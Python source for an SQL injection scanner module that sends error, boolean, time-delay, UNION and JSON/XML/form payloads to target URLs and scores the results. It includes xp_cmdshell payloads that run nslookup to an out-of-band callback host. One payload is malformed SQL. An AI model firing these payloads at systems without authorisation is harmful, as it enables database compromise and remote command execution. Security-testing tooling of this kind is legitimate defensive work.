"""
SQLiScanner — multi-signal SQL injection detection.

Lifecycle:
  DETECTED:   1 signal (error or boolean)
  VALIDATED:  2+ signals
  EXPLOITABLE: 3+ signals (time + error + boolean)
  VERIFIED:   OOB callback received

Maturity: Level 4 (OOB-confirmed)
"""

import hashlib
import json
import time
from typing import Any, Optional
from urllib.parse import urlparse, parse_qs

from models.finding import Finding
from models.evidence import TimingEvidence
from modules.utils import (
    finding, log, Colors, _build_curl, safe_get, safe_post,
    VerificationStage,
    safe_cookies_dict,
)
from scanners.base import ScannerBase, DetectionResult, ValidationResult

SQLI_ERRORS = [
    "sql syntax", "mysql", "ora-", "unclosed quotation mark",
    "you have an error in your sql", "warning: mysql",
    "warning: pg_", "pg_query", "sqlite", "sqlite3",
    "driver error", "odbc", "db2", "unexpected end of sql",
    "quoted string not properly terminated", "division by zero",
    "microsoft ole db", "microsoft odbc",
    "error converting", "the column is null",
    "syntax error", "near \"", "unclosed ",
    "mysql_fetch", "mysql_num_rows", "pg_exec",
    "supplied argument is not a valid",
]

SQLI_PAYLOADS = {
    "error_based": [
        "'", "\"", "\\", "')", "'))", "\"))", "1/0",
        "' OR '1'='1", "\" OR \"1\"=\"1",
        "' UNION SELECT 1--", "\" UNION SELECT 1--",
        "1 AND 1=1", "1 AND 1=2",
        "'; IF 1=1 WAITFOR DELAY '0:0:5'--",
        "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
        "' OR SLEEP(5)--", "' OR pg_sleep(5)--",
        "1' OR '1'='1", "1' OR '1'='2",
    ],
    "boolean_based": [
        ("AND 1=1", "AND 1=2"),
        ("AND '1'='1", "AND '1'='2"),
        ("AND 1=1--", "AND 1=2--"),
        ("OR 1=1--", "OR 1=2--"),
    ],
    "time_based": [
        "' OR SLEEP(5)--", "\" OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR pg_sleep(5)--",
        "1' OR SLEEP(5)--",
        "1) OR SLEEP(5)--",
        "' OR BENCHMARK(5000000,MD5(1))--",
    ],
    "union": [
        " ORDER BY 1--", " ORDER BY 2--", " ORDER BY 3--",
        " ORDER BY 4--", " ORDER BY 5--",
        " UNION SELECT NULL--",
        " UNION SELECT NULL,NULL--",
        " UNION SELECT NULL,NULL,NULL--",
        " UNION SELECT NULL,NULL,NULL,NULL--",
        " UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    ],
    "oob": [
        "'; DROP xp_cmdshell('nslookup {oob}')--",
        "' OR xp_cmdshell('nslookup {oob}')--",
        "'; EXEC xp_cmdshell('nslookup {oob}')--",
        "1' OR 1=1; EXEC xp_cmdshell('nslookup {oob}')--",
    ],
}

POST_SQLI_PAYLOADS = {
    "json": [
        '{"id": "\' OR \'1\'=\'1"}',
        '{"query": "\' OR 1=1--"}',
        '{"search": "\' OR SLEEP(5)--"}',
    ],
    "xml": [
        "<id>' OR '1'='1</id>",
        "<query>' OR 1=1--</query>",
        "<search>' OR SLEEP(5)--</search>",
    ],
    "form": [
        "' OR '1'='1", "' OR 1=1--", "' OR SLEEP(5)--",
    ],
}


class SQLiDetectionResult:
    """Structured detection result for SQLi that carries multi-signal data."""
    def __init__(self, url: str, param: str, signals: dict,
                 triggering_response: str | None = None,
                 timing_evidence: TimingEvidence | None = None,
                 evidence_parts: list[str] | None = None):
        self.url = url
        self.param = param
        self.signals = signals
        self.triggering_response = triggering_response
        self.timing_evidence = timing_evidence
        self.evidence_parts = evidence_parts or []


class SQLiScanner(ScannerBase):
    SCANNER_NAME = "sqli"
    SCANNER_MATURITY = 4

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)

    # ── Detection phase ─────────────────────────────────────────────────

    def detect(self, url: str, parameter: str | None = None) -> SQLiDetectionResult | None:
        oob_host = self.config.get("oob_host")
        parsed = urlparse(url)
        query = parse_qs(parsed.query, keep_blank_values=True)
        if parameter is None:
            params = list(query.keys())
            if not params:
                return None
            parameter = params[0]
        values = query.get(parameter, ["1"])
        original_value = values[0] if values else "1"
        signals, trigger_resp, timing_ev, evidence_parts = self._test_parameter_signals(
            url, parameter, original_value, SQLI_PAYLOADS, oob_host
        )
        if not any(signals.values()):
            return None
        return SQLiDetectionResult(
            url=url,
            param=parameter,
            signals=signals,
            triggering_response=trigger_resp,
            timing_evidence=timing_ev,
            evidence_parts=evidence_parts,
        )

    # ── Validation phase ────────────────────────────────────────────────

    def validate(self, detection: SQLiDetectionResult) -> ValidationResult | None:
        signal_count = sum(1 for v in detection.signals.values() if v)
        evidence_parts = [k for k, v in detection.signals.items() if v]
        if detection.signals.get("oob"):
            return ValidationResult(
                confirmed=True,
                signals=evidence_parts,
                method="oob",
                detail="OOB callback confirmed",
            )
        if signal_count >= 3:
            return ValidationResult(
                confirmed=True,
                signals=evidence_parts,
                method="multi_signal",
                detail=f"{signal_count} SQLi signals detected",
            )
        if signal_count >= 2:
            return ValidationResult(
                confirmed=True,
                signals=evidence_parts,
                method="multi_signal",
                detail=f"{signal_count} SQLi signals detected",
            )
        if signal_count >= 1:
            return ValidationResult(
                confirmed=False,
                signals=evidence_parts,
                method="single_signal",
                detail="Single SQLi signal — needs secondary confirmation",
            )
        return None

    # ── Evidence collection ─────────────────────────────────────────────

    def collect_evidence(self, detection: SQLiDetectionResult,
                         validation: ValidationResult | None = None) -> list:
        ev_list = []
        if detection.timing_evidence:
            ev_list.append(detection.timing_evidence)
        return ev_list

    # ── Reproduction steps ──────────────────────────────────────────────

    def generate_reproduction(self, detection: SQLiDetectionResult,
                              validation: ValidationResult | None = None) -> list[str]:
        signal_detail = "; ".join(detection.evidence_parts)
        is_post = "POST" in detection.param.upper()
        if is_post:
            content_type = "JSON" if "JSON" in detection.param else "XML" if "XML" in detection.param else "form"
            return [
                f"Send POST request to {detection.url} with Content-Type: application/{content_type.lower()} and a SQL injection payload in the body",
                f"Observe signal: {signal_detail}",
                "Compare POST response against baseline — SQL error messages confirm injection",
            ]
        return [
            f"Send GET request to {detection.url} with SQL injection payload in parameter '{detection.param}'",
            f"Observe signal: {signal_detail}",
            "Compare response against baseline — SQL error messages, timing delays, or boolean condition differences confirm injection",
        ]

    # ── Scan entry point ────────────────────────────────────────────────

    def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
        self._prepare_scan()
        oob_host = self.config.get("oob_host")
        urls = self.recon.get("urls", []) if target_urls is None else target_urls

        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                query = parse_qs(parsed.query, keep_blank_values=True)
                for param, _ in query.items():
                    detection_result = self.detect(url, param)
                    if detection_result is None:
                        continue

                    validation_result = self.validate(detection_result)
                    evidence_list = self.collect_evidence(detection_result, validation_result)

                    signal_count = sum(1 for v in detection_result.signals.values() if v)
                    evidence_parts = [k for k, v in detection_result.signals.items() if v]

                    if detection_result.signals.get("oob"):
                        title = "Confirmed SQL Injection (OOB)"
                        severity = "critical"
                        stage = VerificationStage.VERIFIED.value
                    elif signal_count >= 3:
                        title = "SQL Injection"
                        severity = "critical"
                        stage = VerificationStage.VALIDATED.value
                    elif signal_count >= 2:
                        title = "Likely SQL Injection"
                        severity = "high"
                        stage = VerificationStage.VALIDATED.value
                    elif signal_count >= 1:
                        title = "Potential SQL Injection"
                        severity = "medium"
                        stage = VerificationStage.DETECTED.value
                    else:
                        continue

                    f = finding(
                        vuln_type=title,
                        url=url,
                        severity=severity,
                        details=f"Parameter '{param}': {signal_count} signal(s) detected ({', '.join(evidence_parts)})",
                        evidence=" | ".join(evidence_parts),
                        request=_build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=detection_result.triggering_response or "",
                        verification_stage=stage,
                        parameter=param,
                        steps_to_reproduce=self.generate_reproduction(detection_result, validation_result),
                        validation_steps=[f"Signal: {s}" for s in evidence_parts],
                    )
                    if f:
                        for ev in evidence_list:
                            if self.evidence_engine:
                                self.evidence_engine.store(ev)
                                self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                        self._enrich_finding(f, len(evidence_list), f["verification_stage"])
                        self._add_finding(f)
            except Exception as e:
                log(f"  [SQLi] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
        
        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                self._test_post_body(url, SQLI_PAYLOADS, oob_host)
            except Exception as e:
                log(f"  [SQLi POST] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    def _test_parameter_signals(self, url: str, param: str, original_value: str,
                                 payloads: dict, oob_host: Optional[str]) -> tuple[dict, Optional[str], Optional[TimingEvidence], list[str]]:
        signals = {"error": False, "boolean": False, "time": False, "union": False, "oob": False}
        timing_evidence: Optional[TimingEvidence] = None
        evidence_parts: list[str] = []
        triggering_response: Optional[str] = None

        baseline_resp = safe_get(self.session, url, self.timeout)
        baseline_sql_errors: set[str] = set()
        if baseline_resp:
            lower_baseline = baseline_resp.text.lower()
            baseline_sql_errors = {err for err in SQLI_ERRORS if err in lower_baseline}
        for payload in payloads.get("error_based", []):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            lower_body = resp.text.lower()
            matched = [err for err in SQLI_ERRORS if err in lower_body and err not in baseline_sql_errors]
            if matched:
                signals["error"] = True
                evidence_parts.append(f"error:{matched[0]}")
                triggering_response = resp.text[:500]
                break

        boolean_pairs = payloads.get("boolean_based", [])
        if boolean_pairs:
            baseline = safe_get(self.session, url, self.timeout)
            if baseline:
                baseline_hash = hashlib.md5(baseline.text.encode()).hexdigest()
                for true_cond, false_cond in boolean_pairs:
                    true_url = self._inject_param(url, param, f"{original_value} {true_cond}")
                    false_url = self._inject_param(url, param, f"{original_value} {false_cond}")
                    true_resp = safe_get(self.session, true_url, self.timeout)
                    false_resp = safe_get(self.session, false_url, self.timeout)
                    if not (true_resp and false_resp):
                        continue
                    true_hash = hashlib.md5(true_resp.text.encode()).hexdigest()
                    false_hash = hashlib.md5(false_resp.text.encode()).hexdigest()
                    if baseline_hash == true_hash and baseline_hash != false_hash:
                        signals["boolean"] = True
                        evidence_parts.append("boolean:AND 1=1 vs AND 1=2 diff")
                        triggering_response = false_resp.text[:500]
                        break

        baseline_start = time.time()
        safe_get(self.session, url, 15, raise_for_status=False)
        baseline_delay = time.time() - baseline_start
        baseline_ms = baseline_delay * 1000
        for payload in payloads.get("time_based", []):
            test_url = self._inject_param(url, param, payload)
            delays = []
            time_resp = None
            for _ in range(2):
                start = time.time()
                time_resp = safe_get(self.session, test_url, 15, raise_for_status=False)
                delays.append(time.time() - start)
            min_delay = min(delays)
            if min_delay > baseline_delay + 4 and all(d > baseline_delay + 3 for d in delays):
                signals["time"] = True
                triggered_ms = min_delay * 1000
                timing_evidence = TimingEvidence(
                    baseline_time_ms=baseline_ms,
                    triggered_time_ms=triggered_ms,
                    total_attempts=len(delays),
                    description=f"Time-based SQLi on param '{param}': {triggered_ms:.0f}ms vs baseline {baseline_ms:.0f}ms",
                )
                evidence_parts.append(f"time:delays={delays}, baseline={baseline_delay:.2f}s")
                if time_resp:
                    triggering_response = time_resp.text[:500]
                break

        for payload in payloads.get("union", []):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            lower = resp.text.lower()
            if "order by" in payload.lower():
                if not any(err in lower for err in SQLI_ERRORS):
                    evidence_parts.append(f"union:order_by_ok:{payload}")
                    signals["union"] = True
                    triggering_response = resp.text[:500]
                    continue
            if "union select" in payload.lower() and "null" in payload.lower():
                if not any(err in lower for err in SQLI_ERRORS):
                    evidence_parts.append(f"union:matching_columns:{payload}")
                    signals["union"] = True
                    triggering_response = resp.text[:500]
                    break

        if oob_host:
            oob = self.validation.oob if self.validation else None
            if oob:
                for payload in payloads.get("oob", []):
                    formatted = payload.replace("{oob}", f"{oob.callback_token}.{oob_host}")
                    test_url = self._inject_param(url, param, formatted)
                    safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                    oob.register_interaction("sqli", formatted, test_url)
                    time.sleep(1)
                    callbacks = oob.poll()
                    if callbacks:
                        signals["oob"] = True
                        evidence_parts.append(f"oob:callback received from {oob_host}")
                    break

        return signals, triggering_response, timing_evidence, evidence_parts

    def _test_parameter(self, url: str, param: str, original_value: str,
                        payloads: dict, oob_host: Optional[str]) -> tuple[dict, Optional[str], Optional[TimingEvidence]]:
        signals, trigger_resp, timing_ev, _ = self._test_parameter_signals(
            url, param, original_value, payloads, oob_host
        )
        return signals, trigger_resp, timing_ev

    def _test_post_body(self, url: str, payloads: dict, oob_host: Optional[str]) -> None:
        baseline_errors: set[str] = set()
        try:
            baseline_resp = safe_post(self.session, url, data=json.dumps({"id": "1"}),
                                       headers={"Content-Type": "application/json"}, timeout=self.timeout)
            if baseline_resp:
                baseline_errors = {e for e in SQLI_ERRORS if e in baseline_resp.text.lower()}
        except Exception:
            pass

        headers = {"Content-Type": "application/json"}
        for payload in POST_SQLI_PAYLOADS["json"]:
            resp = safe_post(self.session, url, data=payload, headers=headers, timeout=self.timeout)
            if resp:
                new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
                if new_errors:
                    signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
                    f = self._build_finding(url, "POST JSON body", signals,
                        request_str=_build_curl("POST", url, dict(self.session.headers), data=payload, cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt_str=resp.text[:500] if resp else "")
                    if f:
                        self._enrich_finding(f, 0, f["verification_stage"])
                        self._add_finding(f)
                break

        headers = {"Content-Type": "application/xml"}
        for payload in POST_SQLI_PAYLOADS["xml"]:
            resp = safe_post(self.session, url, data=payload, headers=headers, timeout=self.timeout)
            if resp:
                new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
                if new_errors:
                    signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
                    f = self._build_finding(url, "POST XML body", signals,
                        request_str=_build_curl("POST", url, dict(self.session.headers), data=payload, cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt_str=resp.text[:500] if resp else "")
                    if f:
                        self._enrich_finding(f, 0, f["verification_stage"])
                        self._add_finding(f)
                break

        form_fields = ["id", "query", "search", "email", "filter", "name"]
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        for payload in POST_SQLI_PAYLOADS["form"]:
            for field_name in form_fields:
                post_data = {field_name: payload}
                resp = safe_post(self.session, url, data=post_data, headers=headers, timeout=self.timeout)
                if resp:
                    new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
                    if new_errors:
                        signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
                        f = self._build_finding(url, f"POST form body ({field_name})", signals,
                            request_str=_build_curl("POST", url, dict(self.session.headers), data=post_data, cookies=safe_cookies_dict(self.session.cookies)),
                            response_excerpt_str=resp.text[:500] if resp else "")
                        if f:
                            self._enrich_finding(f, 0, f["verification_stage"])
                            self._add_finding(f)
                        break
            else:
                continue
            break

    def _build_finding(self, url: str, param: str, signals: dict,
                       request_str: str = "", response_excerpt_str: str = "") -> Optional[dict]:
        signal_count = sum(1 for v in signals.values() if v)
        evidence_parts = [k for k, v in signals.items() if v]

        if signals.get("oob"):
            title = "Confirmed SQL Injection (OOB)"
            severity = "critical"
            stage = VerificationStage.VERIFIED.value
        elif signal_count >= 3:
            title = "SQL Injection"
            severity = "critical"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 2:
            title = "Likely SQL Injection"
            severity = "high"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 1:
            title = "Potential SQL Injection"
            severity = "medium"
            stage = VerificationStage.DETECTED.value
        else:
            return None

        signal_detail = "; ".join(evidence_parts)
        is_post = "POST" in param.upper()
        if is_post:
            content_type = "JSON" if "JSON" in param else "XML" if "XML" in param else "form"
            steps = [
                f"Send POST request to {url} with Content-Type: application/{content_type.lower()} and a SQL injection payload in the body",
                f"Observe signal: {signal_detail}",
                "Compare POST response against baseline — SQL error messages confirm injection",
            ]
        else:
            steps = [
                f"Send GET request to {url} with SQL injection payload in parameter '{param}'",
                f"Observe signal: {signal_detail}",
                "Compare response against baseline — SQL error messages, timing delays, or boolean condition differences confirm injection",
            ]
        return finding(
            vuln_type=title,
            url=url,
            severity=severity,
            details=f"Parameter '{param}': {signal_count} signal(s) detected ({', '.join(evidence_parts)})",
            evidence=" | ".join(evidence_parts),
            request=request_str or _build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
            response_excerpt=response_excerpt_str,
            verification_stage=stage,
            parameter=param,
            steps_to_reproduce=steps,
            validation_steps=[f"Signal: {s}" for s in evidence_parts],
        )

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        from urllib.parse import urlencode
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        from urllib.parse import urlunparse
        return urlunparse(parsed._replace(query=new_query))
